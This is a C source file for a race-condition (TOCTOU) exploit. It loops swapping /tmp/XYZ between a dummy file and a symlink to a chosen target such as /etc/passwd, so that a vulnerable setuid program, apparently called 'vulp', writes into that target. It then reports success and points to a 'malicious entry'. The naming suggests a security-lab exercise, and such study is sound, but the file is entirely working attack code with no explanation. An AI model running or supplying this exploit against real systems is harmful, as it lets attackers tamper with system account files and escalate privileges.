/* attack_fixed.c - Fixed race condition exploit (parametrizable) */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <time.h>

volatile int running = 1;

void handler(int sig) {
    running = 0;
    printf("\n[!] Attack interrupted by user\n");
}

int create_dummy_file(const char *tmpfile) {
    int fd = open(tmpfile, O_CREAT | O_WRONLY | O_TRUNC, 0666);
    if (fd < 0) {
        return -1;
    }
    write(fd, "dummy\n", 6);
    close(fd);
    return 0;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, handler);

    if (argc != 2) {
        printf("Usage: %s <target_file>\n", argv[0]);
        printf("Example: %s /etc/passwd\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    const char *tmpfile = "/tmp/XYZ";

    printf("=== Fixed Race Condition Attack ===\n");
    printf("Target: %s -> %s\n", tmpfile, target);
    printf("Press Ctrl+C to stop\n\n");

    int attempts = 0;
    time_t start_time = time(NULL);

    // Create initial dummy file
    if (create_dummy_file(tmpfile) < 0) {
        printf("Error: Cannot create initial file in /tmp\n");
        return 1;
    }

    printf("[+] Initial dummy file created\n");
    printf("[+] Starting attack loop...\n");

    while(running && attempts < 50000) {
        attempts++;

        // Phase 1: Create normal file (so access() succeeds)
        unlink(tmpfile);
        if (create_dummy_file(tmpfile) < 0) {
            continue;
        }

        // Small delay to let vulp start and do access() check
        usleep(500);

        // Phase 2: Quick switch to symlink during the delay window
        unlink(tmpfile);
        if (symlink(target, tmpfile) < 0) {
            // If symlink fails, recreate dummy file for next iteration
            create_dummy_file(tmpfile);
            continue;
        }

        // Give vulp time to open the symlink
        usleep(2000);

        // Check if attack succeeded by looking at the target file
        struct stat st;
        if (stat(target, &st) == 0) {
            // Simple check: if target file was modified recently
            time_t now = time(NULL);
            if (now - st.st_mtime < 2) {
                printf("\n[SUCCESS] Attack may have succeeded!\n");
                printf("Attempts: %d\n", attempts);
                printf("Time elapsed: %ld seconds\n", now - start_time);
                printf("Check %s for malicious entry\n", target);
                break;
            }
        }

        // Progress indicator
        if (attempts % 100 == 0) {
            printf("Attempts: %d (%.1f/sec)\r",
                   attempts,
                   (double)attempts / (time(NULL) - start_time + 1));
            fflush(stdout);
        }

        // Reset for next attempt
        unlink(tmpfile);
        usleep(1000);
    }

    // Cleanup
    unlink(tmpfile);
    printf("\n[+] Attack finished\n");
    printf("Total attempts: %d\n", attempts);
    printf("Duration: %ld seconds\n", time(NULL) - start_time);

    return 0;
}